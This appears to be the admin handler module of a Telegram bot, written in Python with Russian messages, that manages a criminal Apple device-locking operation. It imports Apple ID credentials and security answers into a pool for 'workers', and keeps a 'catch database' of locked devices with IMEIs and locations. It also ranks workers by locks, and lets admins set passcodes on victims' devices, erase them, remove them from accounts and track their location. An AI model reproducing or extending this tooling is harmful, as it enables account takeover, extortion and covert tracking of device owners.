# bot/handlers/admin.py
import io
import csv
import asyncio
import re
from typing import Optional
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, BufferedInputFile
from aiogram.filters import Command, BaseFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.exceptions import TelegramBadRequest

from bot.keyboards import (
    get_admin_panel_keyboard,
    get_device_details_keyboard,
    get_locked_list_keyboard,
    get_workers_management_keyboard,
    get_import_keyboard,
    get_settings_keyboard,
)
from utils.logger import logger
from config.settings import settings

# ============================================
# DEPENDENCY INJECTION
# ============================================
_db = None
_broadcast_lock = asyncio.Lock()
_import_lock = asyncio.Lock()


def setup_admin_router(db):
    global _db
    _db = db


def get_db():
    if _db is None:
        raise RuntimeError("Admin router not initialized. Call setup_admin_router() first")
    return _db


# ============================================
# ADMIN FILTER (MIDDLEWARE)
# ============================================
class AdminFilter(BaseFilter):
    async def __call__(self, message: Message) -> bool:
        return message.from_user and message.from_user.id in settings.ADMIN_IDS


class CallbackAdminFilter(BaseFilter):
    async def __call__(self, callback: CallbackQuery) -> bool:
        return callback.from_user and callback.from_user.id in settings.ADMIN_IDS


# ============================================
# FSM STATES
# ============================================
class AdminStates(StatesGroup):
    waiting_for_passcode = State()
    waiting_for_add_worker = State()
    waiting_for_block_worker = State()
    waiting_for_stats_worker = State()
    waiting_for_broadcast = State()
    waiting_for_admin_contact = State()


class ImportStates(StatesGroup):
    waiting_for_accounts = State()


# ============================================
# ROUTER
# ============================================
router = Router()
router.message.filter(AdminFilter())
router.callback_query.filter(CallbackAdminFilter())


# ============================================
# UTILS
# ============================================
def safe_get(data: dict, key: str, default: str = "Неизвестно") -> str:
    if not data:
        return default
    value = data.get(key)
    return str(value) if value is not None else default


def validate_email(email: str) -> bool:
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None


async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup=None):
    try:
        if callback.message:
            await callback.message.edit_text(text, reply_markup=reply_markup)
        else:
            await callback.answer(text)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            return
        logger.warning(f"Edit fallback: {e}")
        try:
            await callback.message.answer(text, reply_markup=reply_markup)
        except Exception:
            pass


def parse_account_line(line: str, line_num: int):
    """Парсинг строки аккаунта: email:password:q1|a1:q2|a2:q3|a3"""
    if ":" not in line:
        return None, f"Строка {line_num}: нет ':'"

    parts = [p.strip() for p in line.split(":") if p.strip()]

    if len(parts) < 2:
        return None, f"Строка {line_num}: недостаточно данных"

    email, password = parts[0], parts[1]

    if not validate_email(email):
        return None, f"Строка {line_num}: некорректный email"

    if len(password) < 3 or len(password) > 100:
        return None, f"Строка {line_num}: некорректная длина пароля"

    security_answers = {}

    for i, qa in enumerate(parts[2:5], 1):
        if "|" in qa:
            q, a = qa.split("|", 1)
            security_answers[f"question{i}"] = q.strip()[:200]
            security_answers[f"q{i}"] = a.strip()[:100]

    return {
        "apple_id": email,
        "current_password": password[:100],
        "security_answers": security_answers,
        "status": "available",
    }, None


# ============================================
# ADMIN PANEL
# ============================================
@router.message(Command("admin"))
async def cmd_admin(message: Message):
    try:
        db = get_db()
        stats = await db.get_system_stats()

        await message.answer(
            f"👑 АДМИН-ПАНЕЛЬ\n\n"
            f"📱 Аккаунтов в пуле: {stats.get('available_accounts', 0)}\n"
            f"🔒 Заблокировано: {stats.get('locked_devices', 0)}\n"
            f"👥 Воркеров онлайн: {stats.get('online_workers', 0)}",
            reply_markup=get_admin_panel_keyboard(),
        )
    except Exception:
        logger.exception("cmd_admin")
        await message.answer("❌ Ошибка загрузки")


# ============================================
# LOCKED DEVICES
# ============================================
@router.callback_query(F.data == "admin_locked")
async def admin_locked(callback: CallbackQuery):
    try:
        db = get_db()
        devices = await db.get_all_locked_devices()

        if not devices:
            return await safe_edit_message(callback, "📭 База улова пуста")

        text = f"🔒 БАЗА УЛОВА ({len(devices)})\n\n"

        for d in devices[:10]:
            text += (
                f"{safe_get(d, 'log_id')}\n"
                f"📱 {safe_get(d, 'device_model')}\n"
                f"📍 {safe_get(d, 'location_address')}\n\n"
            )

        await safe_edit_message(callback, text, get_locked_list_keyboard())
        await callback.answer()
    except Exception:
        logger.exception("admin_locked")
        await safe_edit_message(callback, "❌ Ошибка загрузки")


@router.callback_query(F.data == "admin_archive")
async def admin_archive(callback: CallbackQuery):
    try:
        db = get_db()
        devices = await db.get_all_locked_devices(status="unlocked")

        if not devices:
            return await safe_edit_message(callback, "📦 Архив пуст")

        text = f"📦 АРХИВ ({len(devices)})\n\n"

        for d in devices[:10]:
            text += (
                f"{safe_get(d, 'log_id')}\n"
                f"📱 {safe_get(d, 'device_model')}\n"
                f"📍 {safe_get(d, 'location_address')}\n\n"
            )

        await safe_edit_message(callback, text, get_locked_list_keyboard())
        await callback.answer()
    except Exception:
        logger.exception("admin_archive")
        await safe_edit_message(callback, "❌ Ошибка загрузки")


# ============================================
# SEARCH
# ============================================
@router.callback_query(F.data == "search_log")
async def search_log_prompt(callback: CallbackQuery):
    await callback.message.answer("🔍 Введите ID лога (LOCK-YYYYMMDD-XXX):")
    await callback.answer()


@router.message(F.text & F.text.startswith("LOCK-"))
async def search_log(message: Message):
    try:
        db = get_db()
        device = await db.get_locked_device_by_log_id(message.text.strip())

        if not device:
            return await message.answer("❌ Устройство не найдено")

        lat = device.get("location_lat")
        lon = device.get("location_lon")
        coords = f"\n🌐 {lat:.4f}, {lon:.4f}" if lat is not None and lon is not None else ""

        text = (
            f"📱 ДЕТАЛИ УСТРОЙСТВА\n"
            f"ID: {safe_get(device, 'log_id')}\n"
            f"📱 Модель: {safe_get(device, 'device_model')}\n"
            f"📍 Адрес: {safe_get(device, 'location_address')}"
            f"{coords}\n"
            f"🕐 Время: {safe_get(device, 'captured_at', 'Неизвестно')[:19]}\n"
            f"👤 Воркер: @{safe_get(device, 'worker_username', 'unknown')}"
        )

        await message.answer(text, reply_markup=get_device_details_keyboard(device["log_id"]))
    except Exception:
        logger.exception("search_log")
        await message.answer("❌ Ошибка поиска")


# ============================================
# IMPORT ACCOUNTS (FILE)
# ============================================
@router.callback_query(F.data == "admin_import")
async def admin_import(callback: CallbackQuery):
    await safe_edit_message(
        callback,
        "📥 ИМПОРТ АККАУНТОВ\n\n"
        "Формат: email:password:вопрос1|ответ1:вопрос2|ответ2:вопрос3|ответ3\n\n"
        "Пример:\n"
        "user@mail.com:pass123:Город?|Москва:Школа?|123:Кличка?|Бобик",
        reply_markup=get_import_keyboard(),
    )
    await callback.answer()


@router.callback_query(F.data == "import_file")
async def import_file_prompt(callback: CallbackQuery):
    await callback.message.answer(
        "📎 Отправьте файл .txt или .csv (макс. 10 МБ)\n\n"
        "Формат строки: email:password:вопрос1|ответ1:вопрос2|ответ2:вопрос3|ответ3"
    )
    await callback.answer()


@router.message(F.document)
async def import_file(message: Message):
    global _import_lock

    if _import_lock.locked():
        return await message.answer("⏳ Импорт уже выполняется. Подождите.")

    async with _import_lock:
        try:
            db = get_db()

            if message.document.file_size > 10 * 1024 * 1024:
                return await message.answer("❌ Файл слишком большой (макс. 10 МБ)")

            file = await message.bot.get_file(message.document.file_id)
            file_bytes = await message.bot.download_file(file.file_path)

            try:
                content = file_bytes.read().decode("utf-8")
            except UnicodeDecodeError:
                content = file_bytes.read().decode("cp1251", errors="ignore")

            lines = content.splitlines()
            success = 0
            errors = []

            for i, line in enumerate(lines, 1):
                line = line.strip()
                if not line:
                    continue

                data, err = parse_account_line(line, i)
                if err:
                    errors.append(err)
                    continue

                result = await db.create_account(data)
                if result:
                    success += 1
                else:
                    errors.append(f"{i}: ошибка БД")

            report = f"✅ Импорт завершён\n\nУспешно: {success}\nОшибки: {len(errors)}"
            if errors:
                report += "\n\n" + "\n".join(errors[:10])

            await message.answer(report)
            await db.log_admin_action(message.from_user.id, "import_file",
                                     details=f"success={success}, errors={len(errors)}")
        except Exception:
            logger.exception("import_file")
            await message.answer("❌ Ошибка импорта")


# ============================================
# IMPORT ACCOUNTS (MANUAL)
# ============================================
@router.callback_query(F.data == "import_manual")
async def import_manual_prompt(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ImportStates.waiting_for_accounts)
    await callback.message.answer(
        "📝 Введите аккаунты по одному на строку:\n"
        "email:password:вопрос1|ответ1:вопрос2|ответ2:вопрос3|ответ3\n\n"
        "После ввода всех аккаунтов отправьте команду /done"
    )
    await callback.answer()


@router.message(ImportStates.waiting_for_accounts, F.text & ~F.text.startswith('/'))
async def import_manual_handler(message: Message, state: FSMContext):
    data = await state.get_data()
    accounts = data.get("accounts", [])

    line = message.text.strip()
    if not line:
        return

    parsed, err = parse_account_line(line, len(accounts) + 1)
    if err:
        await message.answer(f"❌ {err}")
        return

    accounts.append(parsed)
    await state.update_data(accounts=accounts)
    await message.answer(f"✅ Добавлен: {parsed['apple_id']} (всего: {len(accounts)})")


@router.message(ImportStates.waiting_for_accounts, F.text == '/done')
async def import_manual_done(message: Message, state: FSMContext):
    db = get_db()
    data = await state.get_data()
    accounts = data.get("accounts", [])

    if not accounts:
        await message.answer("❌ Нет данных для импорта")
        await state.clear()
        return

    success = 0
    for account in accounts:
        result = await db.create_account(account)
        if result:
            success += 1

    await message.answer(f"✅ Импортировано аккаунтов: {success} из {len(accounts)}")
    await db.log_admin_action(message.from_user.id, "import_manual",
                             details=f"success={success}, total={len(accounts)}")
    await state.clear()


@router.callback_query(F.data == "import_confirm")
async def import_confirm(callback: CallbackQuery, state: FSMContext):
    db = get_db()
    data = await state.get_data()
    accounts = data.get("accounts", [])

    if not accounts:
        return await callback.answer("Нет данных для импорта", show_alert=True)

    success = 0
    for account in accounts:
        result = await db.create_account(account)
        if result:
            success += 1

    await callback.message.answer(f"✅ Импортировано: {success} из {len(accounts)}")
    await db.log_admin_action(callback.from_user.id, "import_manual",
                             details=f"success={success}, total={len(accounts)}")
    await state.clear()
    await callback.answer()


@router.callback_query(F.data == "import_report")
async def import_report(callback: CallbackQuery):
    db = get_db()
    accounts = await db.get_available_accounts()
    await callback.answer(f"📊 Всего аккаунтов в пуле: {len(accounts)}", show_alert=True)


# ============================================
# EXPORT
# ============================================
@router.callback_query(F.data == "export_locked")
async def export_locked(callback: CallbackQuery):
    try:
        db = get_db()
        devices = await db.get_all_locked_devices()

        if not devices:
            return await callback.answer("Нет данных", show_alert=True)

        output = io.StringIO(newline='')
        writer = csv.writer(output)
        writer.writerow(["log_id", "model", "imei", "location", "date", "status"])

        for d in devices:
            writer.writerow([
                d.get("log_id", ""),
                d.get("device_model", ""),
                d.get("imei", ""),
                d.get("location_address", ""),
                d.get("captured_at", ""),
                d.get("status", ""),
            ])

        file = BufferedInputFile(output.getvalue().encode(), filename="devices.csv")
        await callback.message.answer_document(file, caption="📊 Экспорт базы улова")
        await callback.answer()
    except Exception:
        logger.exception("export_locked")
        await callback.answer("❌ Ошибка экспорта", show_alert=True)


# ============================================
# WORKERS MANAGEMENT
# ============================================
@router.callback_query(F.data == "admin_workers")
async def admin_workers(callback: CallbackQuery):
    try:
        db = get_db()
        workers = await db.get_workers_top()

        text = "👥 УПРАВЛЕНИЕ ВОРКЕРАМИ\n\n"
        if workers.get("top"):
            text += "ТОП-10:\n"
            for i, w in enumerate(workers.get("top", [])[:10], 1):
                text += f"{i}. @{w.get('username', 'unknown')} — {w.get('total_locks', 0)} локов\n"
        else:
            text += "Нет зарегистрированных воркеров\n"

        await safe_edit_message(callback, text, get_workers_management_keyboard())
        await callback.answer()
    except Exception:
        logger.exception("admin_workers")
        await safe_edit_message(callback, "❌ Ошибка")


@router.callback_query(F.data == "add_worker")
async def add_worker(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_add_worker)
    await callback.message.answer(
        "➕ Добавление воркера\n\n"
        "Отправьте Telegram ID пользователя:\n"
        "Пример: 123456789"
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_add_worker, F.text & F.text.isdigit())
async def add_worker_handler(message: Message, state: FSMContext):
    db = get_db()
    telegram_id = int(message.text.strip())

    result = await db.create_worker(telegram_id, f"user_{telegram_id}")

    if result:
        await message.answer(f"✅ Воркер {telegram_id} добавлен")
        await db.log_admin_action(message.from_user.id, "add_worker", target=str(telegram_id))
    else:
        await message.answer(f"❌ Ошибка добавления")

    await state.clear()


@router.callback_query(F.data == "block_worker")
async def block_worker(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_block_worker)
    await callback.message.answer(
        "🔫 Блокировка воркера\n\n"
        "Отправьте Telegram ID для блокировки"
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_block_worker, F.text & F.text.isdigit())
async def block_worker_handler(message: Message, state: FSMContext):
    db = get_db()
    telegram_id = int(message.text.strip())

    success = await db.block_worker(telegram_id)

    if success:
        await message.answer(f"✅ Воркер {telegram_id} заблокирован")
        await db.log_admin_action(message.from_user.id, "block_worker", target=str(telegram_id))
    else:
        await message.answer(f"❌ Воркер не найден")

    await state.clear()


@router.callback_query(F.data == "worker_stats")
async def worker_stats(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_stats_worker)
    await callback.message.answer(
        "📊 Статистика воркера\n\n"
        "Отправьте Telegram ID воркера"
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_stats_worker, F.text & F.text.isdigit())
async def worker_stats_handler(message: Message, state: FSMContext):
    db = get_db()
    telegram_id = int(message.text.strip())

    worker = await db.get_worker_by_telegram_id(telegram_id)

    if not worker:
        await message.answer("❌ Воркер не найден")
        await state.clear()
        return

    stats = await db.get_worker_stats(worker["id"])

    text = (
        f"📊 СТАТИСТИКА ВОРКЕРА\n\n"
        f"👤 @{worker.get('username', 'unknown')}\n"
        f"🔒 Локи сегодня: {stats.get('today_locks', 0)}\n"
        f"🔒 Локи всего: {stats.get('total_locks', 0)}\n"
        f"📱 Аккаунтов взято: {stats.get('total_taken', 0)}"
    )
    await message.answer(text)
    await state.clear()


# ============================================
# BROADCAST
# ============================================
@router.callback_query(F.data == "broadcast")
async def broadcast(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_broadcast)
    await callback.message.answer(
        "📨 РАССЫЛКА\n\n"
        "Отправьте сообщение для всех воркеров\n"
        "Для отмены введите /cancel"
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_broadcast, F.text & F.text.startswith('/cancel'))
async def broadcast_cancel(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("❌ Рассылка отменена")


@router.message(AdminStates.waiting_for_broadcast, F.text & ~F.text.startswith('/'))
async def broadcast_handler(message: Message, state: FSMContext):
    global _broadcast_lock

    if _broadcast_lock.locked():
        return await message.answer("⏳ Рассылка уже выполняется. Подождите.")

    db = get_db()
    workers = await db.get_all_workers(blocked=False)

    if not workers:
        await message.answer("❌ Нет активных воркеров")
        await state.clear()
        return

    async with _broadcast_lock:
        sent = 0
        for w in workers:
            try:
                await message.bot.send_message(w["telegram_id"], f"📢 РАССЫЛКА ОТ АДМИНА:\n\n{message.text}")
                sent += 1
                await asyncio.sleep(0.1)
            except Exception:
                pass

        await message.answer(f"✅ Отправлено {sent} из {len(workers)} воркерам")
        await db.log_admin_action(message.from_user.id, "broadcast",
                                 details=f"sent={sent}, total={len(workers)}")
        await state.clear()


# ============================================
# SETTINGS
# ============================================
@router.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    db = get_db()
    settings_data = await db.get_settings()
    admin_contact = settings_data.get("admin_contact", "@admin")

    await safe_edit_message(
        callback,
        f"⚙ НАСТРОЙКИ\n\n"
        f"Контакт админа: {admin_contact}\n\n"
        f"Выберите действие:",
        reply_markup=get_settings_keyboard(),
    )
    await callback.answer()


@router.callback_query(F.data == "change_admin_contact")
async def change_admin_contact(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminStates.waiting_for_admin_contact)
    await callback.message.answer(
        "✏️ Изменение контакта админа\n\n"
        "Введите новый юзернейм (например, @newadmin)"
    )
    await callback.answer()


@router.message(AdminStates.waiting_for_admin_contact, F.text & F.text.startswith('@'))
async def change_admin_contact_handler(message: Message, state: FSMContext):
    db = get_db()
    new_contact = message.text.strip()

    success = await db.update_setting("admin_contact", new_contact)

    if success:
        await message.answer(f"✅ Контакт админа изменён на {new_contact}")
        await db.log_admin_action(message.from_user.id, "change_admin_contact", details=new_contact)
    else:
        await message.answer(f"❌ Ошибка сохранения")

    await state.clear()


@router.callback_query(F.data == "save_settings")
async def save_settings(callback: CallbackQuery):
    await callback.answer("✅ Настройки сохранены", show_alert=True)


@router.callback_query(F.data == "timer_settings")
async def timer_settings(callback: CallbackQuery):
    await callback.answer("⏱ Настройки таймера будут доступны в следующей версии", show_alert=True)


@router.callback_query(F.data == "monitor_settings")
async def monitor_settings(callback: CallbackQuery):
    await callback.answer("🔍 Настройки мониторинга будут доступны в следующей версии", show_alert=True)


# ============================================
# DEVICE ACTIONS
# ============================================
@router.callback_query(F.data.startswith("unlock_"))
async def mark_unlocked(callback: CallbackQuery):
    try:
        db = get_db()
        log_id = callback.data.replace("unlock_", "")
        await db.update_device_status(log_id, "unlocked")
        await callback.answer(f"🔓 Устройство {log_id} отмечено как разблокированное", show_alert=True)
        await db.log_admin_action(callback.from_user.id, "unlock_device", target=log_id)
        await admin_locked(callback)
    except Exception:
        logger.exception("mark_unlocked")
        await callback.answer("❌ Ошибка", show_alert=True)


@router.callback_query(F.data.startswith("erase_"))
async def erase_device(callback: CallbackQuery):
    try:
        db = get_db()
        log_id = callback.data.replace("erase_", "")
        device = await db.get_locked_device_by_log_id(log_id)

        if not device:
            return await callback.answer("❌ Устройство не найдено", show_alert=True)

        success = await db.erase_device(device)
        if success:
            await callback.answer(f"🗑 Устройство {log_id} стёрто", show_alert=True)
            await db.log_admin_action(callback.from_user.id, "erase_device", target=log_id)
        else:
            await callback.answer(f"❌ Не удалось стереть устройство {log_id}", show_alert=True)

        await admin_locked(callback)
    except Exception:
        logger.exception("erase_device")
        await callback.answer("❌ Ошибка", show_alert=True)


@router.callback_query(F.data.startswith("passcode_"))
async def set_passcode(callback: CallbackQuery, state: FSMContext):
    try:
        db = get_db()
        log_id = callback.data.replace("passcode_", "")
        await state.update_data(passcode_log_id=log_id)
        await state.set_state(AdminStates.waiting_for_passcode)

        await callback.message.answer(
            f"🔢 Установка кода-пароля для устройства {log_id}\n\n"
            "Введите 4-6 цифр для кода-пароля:"
        )
        await callback.answer()
    except Exception:
        logger.exception("set_passcode")
        await callback.answer("❌ Ошибка", show_alert=True)


@router.message(AdminStates.waiting_for_passcode, F.text & F.text.isdigit() & (F.text.len() >= 4) & (F.text.len() <= 6))
async def passcode_handler(message: Message, state: FSMContext):
    db = get_db()
    data = await state.get_data()
    log_id = data.get("passcode_log_id")

    if not log_id:
        await message.answer("❌ Сессия устарела. Нажмите кнопку КОД-ПАРОЛЬ заново")
        await state.clear()
        return

    device = await db.get_locked_device_by_log_id(log_id)
    if not device:
        await message.answer("❌ Устройство не найдено")
        await state.clear()
        return

    passcode = message.text.strip()
    success = await db.set_device_passcode(device, passcode)

    if success:
        await message.answer(f"✅ Код-пароль {passcode} установлен для устройства {log_id}")
        await db.log_admin_action(message.from_user.id, "set_passcode", target=log_id, details=passcode)
    else:
        await message.answer(f"❌ Не удалось установить код-пароль")

    await state.clear()


@router.message(AdminStates.waiting_for_passcode)
async def invalid_passcode(message: Message):
    await message.answer("❌ Неверный формат. Введите 4-6 цифр.")


@router.callback_query(F.data.startswith("remove_"))
async def remove_from_account(callback: CallbackQuery):
    try:
        db = get_db()
        log_id = callback.data.replace("remove_", "")
        device = await db.get_locked_device_by_log_id(log_id)

        if not device:
            return await callback.answer("❌ Устройство не найдено", show_alert=True)

        success = await db.remove_device_from_account(device)
        if success:
            await callback.answer(f"❌ Устройство {log_id} удалено с аккаунта", show_alert=True)
            await db.log_admin_action(callback.from_user.id, "remove_device", target=log_id)
        else:
            await callback.answer(f"❌ Не удалось удалить устройство {log_id}", show_alert=True)

        await admin_locked(callback)
    except Exception:
        logger.exception("remove_from_account")
        await callback.answer("❌ Ошибка", show_alert=True)


@router.callback_query(F.data.startswith("sound_"))
async def play_sound(callback: CallbackQuery):
    try:
        db = get_db()
        log_id = callback.data.replace("sound_", "")
        device = await db.get_locked_device_by_log_id(log_id)

        if not device:
            return await callback.answer("❌ Устройство не найдено", show_alert=True)

        success = await db.play_sound_on_device(device)
        if success:
            await callback.answer(f"🔔 Звуковой сигнал отправлен на устройство {log_id}", show_alert=True)
            await db.log_admin_action(callback.from_user.id, "play_sound", target=log_id)
        else:
            await callback.answer(f"❌ Не удалось отправить сигнал", show_alert=True)
    except Exception:
        logger.exception("play_sound")
        await callback.answer("❌ Ошибка", show_alert=True)


@router.callback_query(F.data.startswith("location_"))
async def update_location(callback: CallbackQuery):
    try:
        db = get_db()
        log_id = callback.data.replace("location_", "")
        device = await db.get_locked_device_by_log_id(log_id)

        if not device:
            return await callback.answer("❌ Устройство не найдено", show_alert=True)

        location = await db.get_device_location(device)

        if location and location.get("lat") and location.get("lon"):
            await callback.answer(f"📍 Новая локация: {location['lat']:.4f}, {location['lon']:.4f}", show_alert=True)
            await db.update_device_location(log_id, location["lat"], location["lon"])
            await db.log_admin_action(callback.from_user.id, "update_location", target=log_id)
        else:
            await callback.answer("📍 Устройство не найдено или офлайн", show_alert=True)
    except Exception:
        logger.exception("update_location")
        await callback.answer("❌ Ошибка", show_alert=True)


# ============================================
# NAVIGATION
# ============================================
@router.callback_query(F.data == "back_to_admin")
async def back_to_admin(callback: CallbackQuery):
    db = get_db()
    stats = await db.get_system_stats()

    await safe_edit_message(
        callback,
        f"👑 АДМИН-ПАНЕЛЬ\n\n"
        f"📱 Аккаунтов в пуле: {stats.get('available_accounts', 0)}\n"
        f"🔒 Заблокировано: {stats.get('locked_devices', 0)}\n"
        f"👥 Воркеров онлайн: {stats.get('online_workers', 0)}",
        reply_markup=get_admin_panel_keyboard(),
    )
    await callback.answer()


@router.callback_query(F.data == "back_to_locked")
async def back_to_locked(callback: CallbackQuery):
    await admin_locked(callback)
